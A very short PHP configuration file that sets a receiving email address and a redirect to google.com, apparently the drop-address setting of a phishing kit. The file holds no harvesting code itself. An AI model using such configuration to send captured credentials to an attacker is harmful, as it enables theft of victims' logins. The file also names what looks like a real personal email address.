<?php 
$Receive_email="markbroody1@gmail.com";
$redirect="https://www.google.com/";
?>